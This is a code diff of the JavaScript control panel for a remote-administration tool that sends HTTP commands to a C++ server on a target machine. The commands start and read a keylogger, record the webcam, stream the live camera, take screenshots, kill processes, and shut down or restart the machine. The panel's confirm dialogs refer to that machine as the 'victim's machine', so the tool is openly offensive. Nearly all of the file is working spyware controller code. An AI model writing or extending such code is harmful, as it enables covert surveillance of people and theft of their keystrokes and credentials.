@@ -1,318 +1,276 @@
 /* -------------------------
-   Globals & helpers
+   GLOBALS & HELPERS
    ------------------------- */
-let IP = "";            // current connected IP (string) or empty
-let onWebcamImg = null; // img element for MJPEG or data URL
+let IP = "";            // IP của máy Server
 let localOnCamStream = null;
-let localRecordChunks = [];
 
-/* toast */
+// Hàm hiển thị thông báo Toast
 function showToast(text, type = "success"){
     const cont = document.getElementById("toast-container");
     const t = document.createElement("div");
-    t.className = "toast " + (type === "success" ? "success" : "error");
-    t.innerText = text;
+    t.className = "toast " + (type === "success" ? "" : "error");
+    t.innerHTML = (type === "success" ? '<i class="fa-solid fa-circle-check"></i> ' : '<i class="fa-solid fa-triangle-exclamation"></i> ') + text;
     cont.appendChild(t);
-    setTimeout(()=> { t.remove(); }, 5000);
+    setTimeout(()=> { t.remove(); }, 4000);
 }
 
-/* top tabs */
-document.querySelectorAll('.tab').forEach(btn => {
-    btn.addEventListener('click', (ev) => {
-        document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
-        document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
-        btn.classList.add('active');
-        const target = btn.dataset.target;
-        document.getElementById(target).classList.add('active');
-    });
-});
-
-/* basic fetch wrapper */
+// Hàm gửi lệnh POST tới Server C++
 async function postControl(payload){
     if(!IP) throw new Error("not-connected");
     const url = `http://${IP}:8080/control`;
-    const res = await fetch(url, {
-        method: "POST",
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify(payload)
-    });
-    if(!res.ok) throw new Error("bad-response");
-    return res.text();
+    
+    // Thêm timeout để không bị treo nếu mạng lag
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), 5000); // 5s timeout
+
+    try {
+        const res = await fetch(url, {
+            method: "POST",
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify(payload),
+            signal: controller.signal
+        });
+        clearTimeout(id);
+        if(!res.ok) throw new Error("Server error: " + res.status);
+        return res.text();
+    } catch (error) {
+        clearTimeout(id);
+        throw error;
+    }
 }
 
 /* -------------------------
-   Connect / Disconnect
+   CONNECTION LOGIC
    ------------------------- */
 document.getElementById('btnConnect').addEventListener('click', async ()=>{
-    const ip = document.getElementById('ipInput').value.trim();
+    const ipInput = document.getElementById('ipInput');
+    const ip = ipInput.value.trim();
+    const statusDiv = document.getElementById('connectStatus');
+
+    // Validate IP
     if(!/^(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)$/.test(ip)){
-        showToast("IP không hợp lệ", "error"); return;
+        showToast("Địa chỉ IP không hợp lệ!", "error"); 
+        return;
     }
+
     try {
-        // ping endpoint
+        showToast("Đang kết nối tới " + ip + "...", "warning");
+        statusDiv.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Connecting...`;
+        
+        // Ping kiểm tra
         const pingRes = await fetch(`http://${ip}:8080/ping`, {method:'GET'});
-        if(!pingRes.ok) throw new Error("ping failed");
+        if(!pingRes.ok) throw new Error("Ping thất bại");
+        
+        // Nếu thành công
         IP = ip;
-        document.getElementById('connectStatus').innerText = `✔ Connected to ${IP}`;
-        showToast("Kết nối thành công");
+        statusDiv.innerHTML = `<i class="fa-solid fa-wifi"></i> Connected: ${IP}`;
+        statusDiv.style.background = "#064e3b"; // Xanh đậm
+        statusDiv.style.color = "#34d399";       // Xanh sáng
+        statusDiv.style.border = "1px solid #059669";
+        
+        // Ẩn nút Connect, hiện nút Disconnect
+        document.getElementById('btnConnect').style.display = 'none';
+        document.getElementById('btnDisconnect').style.display = 'inline-block';
+        ipInput.disabled = true;
+
+        showToast("Kết nối thành công! Server đang sẵn sàng.");
+
     } catch(e){
         IP = "";
-        document.getElementById('connectStatus').innerText = `❌ Failed to connect to ${ip}`;
-        showToast("Không thể kết nối backend trên " + ip, "error");
+        statusDiv.innerHTML = `<i class="fa-solid fa-circle-xmark"></i> Connection Failed`;
+        statusDiv.style.color = "#f87171";
+        showToast("Không thể kết nối! Hãy kiểm tra IP hoặc Tường lửa máy Server.", "error");
+        console.error(e);
     }
 });
 
 document.getElementById('btnDisconnect').addEventListener('click', ()=>{
     IP = "";
-    document.getElementById('connectStatus').innerText = `Disconnected`;
-    showToast("Đã ngắt kết nối");
+    const statusDiv = document.getElementById('connectStatus');
+    statusDiv.innerHTML = `<i class="fa-solid fa-circle-xmark"></i> Disconnected`;
+    statusDiv.style.background = "#334155";
+    statusDiv.style.color = "#94a3b8";
+    statusDiv.style.border = "none";
+
+    document.getElementById('btnConnect').style.display = 'inline-block';
+    document.getElementById('btnDisconnect').style.display = 'none';
+    document.getElementById('ipInput').disabled = false;
+    
+    showToast("Đã ngắt kết nối.");
 });
 
 /* -------------------------
-   Application commands
+   COMMAND HANDLER
    ------------------------- */
-async function handleListApp(){
-    try {
-        const txt = await postControl({command:'listApp'});
-        document.getElementById('appList').innerText = txt;
-    } catch(e){
-        showToast("List app failed", "error");
-    }
-}
-document.querySelector('[data-target="application"]').addEventListener('click', ()=>{}); // noop
-
 window.sendCommand = async function(cmd){
-    // Generic command sender used by buttons (keeps backwards compatibility)
     try {
         switch(cmd){
-            case 'listApp': {
-                const txt = await postControl({command:'listApp'});
-                document.getElementById('appList').innerText = txt;
-                showToast('List applications received');
+            // --- APP & PROCESS ---
+            case 'listApp': 
+                const listApp = await postControl({command:'listApp'});
+                document.getElementById('appList').innerText = listApp;
                 break;
-            }
-            case 'startApp': {
-                const name = document.getElementById('appName').value.trim();
-                if(!name){ showToast('Nhập tên app', 'error'); return; }
-                const txt = await postControl({command:'startApp', name});
-                showToast('Start app: ' + name);
-                document.getElementById('appList').innerText = txt;
+            
+            case 'startApp':
+                const appName = document.getElementById('appName').value.trim();
+                if(!appName) return showToast('Chưa nhập tên App', 'error');
+                await postControl({command:'startApp', name: appName});
+                showToast(`Đã gửi lệnh mở: ${appName}`);
                 break;
-            }
-            case 'stopApp': {
-                const name = document.getElementById('appName').value.trim();
-                if(!name){ showToast('Nhập tên app', 'error'); return; }
-                const txt = await postControl({command:'stopApp', name});
-                showToast('Stop app: ' + name);
-                document.getElementById('appList').innerText = txt;
-                break;
-            }
 
-            case 'listProcess': {
-                const txt = await postControl({command:'listProcess'});
-                document.getElementById('processList').innerText = txt;
-                showToast('List processes received');
+            case 'stopApp':
+                const appStop = document.getElementById('appName').value.trim();
+                await postControl({command:'stopApp', name: appStop});
+                showToast('Đã gửi lệnh đóng App');
                 break;
-            }
-            case 'startProcess': {
-                const name = document.getElementById('processName').value.trim();
-                if(!name){ showToast('Nhập tên process', 'error'); return; }
-                const txt = await postControl({command:'startProcess', name});
-                showToast('Start process: ' + name);
-                document.getElementById('processList').innerText = txt;
-                break;
-            }
-            case 'stopProcess': {
-                const name = document.getElementById('processName').value.trim();
-                if(!name){ showToast('Nhập tên process', 'error'); return; }
-                const txt = await postControl({command:'stopProcess', name});
-                showToast('Stop process: ' + name);
-                document.getElementById('processList').innerText = txt;
-                break;
-            }
 
+            case 'listProcess':
+                const listProc = await postControl({command:'listProcess'});
+                document.getElementById('processList').innerText = listProc;
+                break;
+
+            case 'stopProcess':
+                const procName = document.getElementById('processName').value.trim();
+                if(!procName) return showToast('Chưa nhập PID/Tên Process', 'error');
+                const resProc = await postControl({command:'stopProcess', name: procName});
+                showToast(resProc.includes("Loi") ? resProc : "Đã diệt Process thành công", resProc.includes("Loi") ? "error" : "success");
+                break;
+
+            // --- SCREENSHOT ---
             case 'screenshot': {
-                const txt = await postControl({command:'screenshot'});
-                // Expect backend to return either a URL to image or a base64 data URL
-                document.getElementById('screenshotResult').innerHTML = `<img src="${txt}" alt="screenshot">`;
-                showToast('Screenshot received');
+                showToast("Đang chụp màn hình...", "warning");
+                const path = await postControl({command:'screenshot'});
+                
+                // Fix cache bằng timestamp
+                const ts = new Date().getTime();
+                const fullUrl = `http://${IP}:8080${path}?t=${ts}`;
+                
+                const html = `
+                    <div style="display: flex; flex-direction: column; align-items: center; gap: 15px;">
+                        <img src="${fullUrl}" 
+                             style="max-height: 60vh; width: auto; max-width: 100%; border: 2px solid #475569; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5);">
+                        <a href="${fullUrl}" download="screenshot_${ts}.png">
+                            <button class="action-btn btn-green" style="padding: 10px 30px;">
+                                <i class="fa-solid fa-download"></i> TẢI ẢNH GỐC
+                            </button>
+                        </a>
+                    </div>`;
+                document.getElementById('screenshotResult').innerHTML = html;
+                showToast("Đã nhận ảnh mới nhất!");
                 break;
             }
 
+            // --- WEBCAM RECORD ---
             case 'recordWebcam': {
-                const s = parseInt(document.getElementById('recSeconds').value || "0", 10);
-                if(!s || s <= 0){ showToast('Nhập seconds > 0', 'error'); return; }
-                const txt = await postControl({command:'recordWebcam', seconds:s});
-                // backend should return location or message
-                document.getElementById('recordResult').innerText = txt;
-                showToast('Record completed');
+                const sec = document.getElementById('recSeconds').value;
+                showToast(`Đang quay video trong ${sec} giây...`, "warning");
+                
+                const path = await postControl({command:'recordWebcam', seconds: sec});
+                
+                if(path.includes("Loi")) {
+                    showToast(path, "error");
+                } else {
+                    const fullUrl = `http://${IP}:8080${path}`;
+                    document.getElementById('recordResult').innerHTML = `
+                        <div style="color: #10b981; margin-bottom: 10px;">✅ Quay thành công!</div>
+                        <a href="${fullUrl}" target="_blank">
+                            <button class="action-btn btn-primary"><i class="fa-solid fa-play"></i> Xem / Tải Video</button>
+                        </a>
+                    `;
+                    showToast("Quay xong! Hãy tải video.");
+                }
                 break;
             }
 
-            case 'startKeylogger': {
-                const txt = await postControl({command:'startKeylogger'});
-                document.getElementById('keylogResult').innerText = txt;
-                showToast('Keylogger started');
+            // --- KEYLOGGER ---
+            case 'startKeylogger':
+                await postControl({command:'startKeylogger'});
+                showToast("Keylogger đã bắt đầu theo dõi");
                 break;
-            }
-            case 'stopKeylogger': {
-                const txt = await postControl({command:'stopKeylogger'});
-                document.getElementById('keylogResult').innerText = txt;
-                showToast('Keylogger stopped');
+            case 'stopKeylogger':
+                await postControl({command:'stopKeylogger'});
+                showToast("Đã dừng Keylogger");
                 break;
-            }
-            case 'getKeylog': {
-                const txt = await postControl({command:'getKeylog'});
-                document.getElementById('keylogResult').innerText = txt;
-                showToast('Keylog received');
+            case 'getKeylog':
+                const logs = await postControl({command:'getKeylog'});
+                document.getElementById('keylogResult').innerText = logs;
+                showToast("Đã cập nhật Log");
                 break;
-            }
 
+            // --- SYSTEM ---
             case 'shutdown':
-            case 'restart': {
-                const txt = await postControl({command:cmd});
-                showToast(`${cmd} command sent`);
+                if(confirm("Bạn có chắc chắn muốn TẮT máy nạn nhân?")) {
+                    await postControl({command:'shutdown'});
+                    showToast("Đã gửi lệnh Shutdown!", "error");
+                }
                 break;
-            }
-
-            default:
-                showToast('Unknown command: ' + cmd, 'error');
+            case 'restart':
+                if(confirm("Khởi động lại máy nạn nhân?")) {
+                    await postControl({command:'restart'});
+                    showToast("Đã gửi lệnh Restart!", "warning");
+                }
+                break;
         }
     } catch(err){
         if(err.message === 'not-connected'){
-            showToast('Chưa kết nối IP', 'error');
+            showToast('Vui lòng kết nối trước!', 'error');
         } else {
-            showToast('Lỗi khi gởi lệnh: ' + (err.message||err), 'error');
+            showToast('Lỗi: ' + err.message, 'error');
         }
     }
 };
 
 /* -------------------------
-   OnWebcam (live view)
-   Strategy:
-    - If backend provides MJPEG at http://IP:8080/camera, use <img src="...">
-    - Otherwise fallback to local getUserMedia demo
+   WEBCAM STREAMING
    ------------------------- */
 function startOnWebcam(){
-    if(!IP){
-        // local demo
-        startLocalOnCam();
-        return;
+    const container = document.getElementById('onWebcamContainer');
+    
+    // Nếu ĐÃ kết nối Server -> Dùng luồng MJPEG từ Server
+    if(IP) {
+        const mjpegUrl = `http://${IP}:8080/camera`;
+        container.innerHTML = `
+            <img id="mjpegStream" src="${mjpegUrl}" 
+                 style="width: 100%; height: 100%; object-fit: contain; border-radius: 8px;">
+        `;
+        showToast("Đang nhận dữ liệu từ Camera Server...");
+    } 
+    // Nếu CHƯA kết nối -> Dùng Local Demo (Tránh người dùng tưởng lỗi)
+    else {
+        startLocalDemo();
     }
-    const mjpegURL = `http://${IP}:8080/camera`;
-    // Test fetch to see if MJPEG endpoint exists
-    fetch(mjpegURL, {method:'HEAD'}).then(res=>{
-        if(res.ok){
-            // insert <img> that points to MJPEG stream
-            const c = document.getElementById('onWebcamContainer');
-            c.innerHTML = `<img id="mjpegStream" src="${mjpegURL}" alt="camera stream">`;
-            showToast('Using backend MJPEG stream');
-        } else {
-            // fallback to local
-            startLocalOnCam();
-        }
-    }).catch(()=> startLocalOnCam());
 }
 
 function stopOnWebcam(){
-    // remove MJPEG image if present
-    const img = document.getElementById('mjpegStream');
-    if(img) img.remove();
-    // stop local stream if any
+    const container = document.getElementById('onWebcamContainer');
+    container.innerHTML = '<span style="color: #64748b;">Màn hình Camera</span>';
+    
+    // Dừng local stream nếu có
     if(localOnCamStream){
-        localOnCamStream.getTracks().forEach(t=>t.stop());
+        localOnCamStream.getTracks().forEach(t => t.stop());
         localOnCamStream = null;
-        const c = document.getElementById('onWebcamContainer');
-        c.innerHTML = '';
+    }
+    
+    // Đối với Server MJPEG, chỉ cần xóa thẻ img là trình duyệt tự ngắt kết nối socket
+    showToast("Đã tắt màn hình Camera.");
+}
+
+async function startLocalDemo(){
+    try {
+        localOnCamStream = await navigator.mediaDevices.getUserMedia({video: true});
+        const container = document.getElementById('onWebcamContainer');
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.style.width = "100%";
+        video.style.height = "100%";
+        video.style.borderRadius = "8px";
+        video.srcObject = localOnCamStream;
+        
+        container.innerHTML = "";
+        container.appendChild(video);
+        
+        showToast("⚠️ Chưa kết nối Server! Đang dùng Camera của BẠN để demo.", "warning");
+    } catch(e) {
+        showToast("Không thể mở Camera demo: " + e.message, "error");
     }
 }
-
-async function startLocalOnCam(){
-    try{
-        localOnCamStream = await navigator.mediaDevices.getUserMedia({video:true});
-        const c = document.getElementById('onWebcamContainer');
-        c.innerHTML = `<video id="localOnCam" autoplay playsinline></video>`;
-        document.getElementById('localOnCam').srcObject = localOnCamStream;
-        showToast('Local camera activated (demo)');
-    } catch(e){
-        showToast('Không thể mở camera local', 'error');
-    }
-}
-
-/* -------------------------
-   Local webcam record demo (in-browser)
-   ------------------------- */
-async function localRecordDemo(){
-    try{
-        const s = parseInt(document.getElementById('recSeconds').value || "0", 10);
-        if(!s || s <= 0){ showToast('Nhập seconds > 0', 'error'); return; }
-
-        const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.start();
-
-        showToast(`Recording local ${s}s...`);
-        await new Promise(r => setTimeout(r, s*1000));
-        recorder.stop();
-
-        await new Promise(resolve => recorder.onstop = resolve);
-        stream.getTracks().forEach(t=>t.stop());
-
-        const blob = new Blob(chunks, {type:'video/webm'});
-        const url = URL.createObjectURL(blob);
-        document.getElementById('recordResult').innerHTML = `<a href="${url}" download="record.webm">Download local recording</a>`;
-        showToast('Local record ready');
-    } catch(e){
-        showToast('Local record failed', 'error');
-    }
-}
-
-/* -------------------------
-   Local screenshot demo
-   ------------------------- */
-function localScreenshotDemo(){
-    // just a placeholder image (can't screenshot other window from browser)
-    document.getElementById('screenshotResult').innerHTML = `<img src="https://via.placeholder.com/800x450?text=Screenshot+Demo">`;
-    showToast('Local screenshot demo shown');
-}
-
-/* -------------------------
-   local demo keylogger (only records keys pressed in browser)
-   ------------------------- */
-let demoKeylog = "";
-let demoLogging = false;
-function startLocalKeyloggerDemo(){
-    demoLogging = true;
-    demoKeylog = "";
-    showToast('Local keylogger started (demo)');
-    window.addEventListener('keydown', demoKeyListener);
-}
-function stopLocalKeyloggerDemo(){
-    demoLogging = false;
-    window.removeEventListener('keydown', demoKeyListener);
-    showToast('Local keylogger stopped (demo)');
-}
-function demoKeyListener(e){
-    demoKeylog += e.key + " ";
-    document.getElementById('keylogResult').innerText = demoKeylog;
-}
-
-function startKeylogger(){ // called by button (attempt remote, fallback to local demo)
-    if(!IP){ startLocalKeyloggerDemo(); return; }
-    sendCommand('startKeylogger');
-}
-function stopKeylogger(){
-    if(!IP){ stopLocalKeyloggerDemo(); return; }
-    sendCommand('stopKeylogger');
-}
-
-/* -------------------------
-   Convenience: wire some UI buttons to legacy sendCommand calls
-   (these are inline onclick in HTML using sendCommand)
-   ------------------------- */
-
-// the HTML calls sendCommand(...) directly
-
-/* End of script */
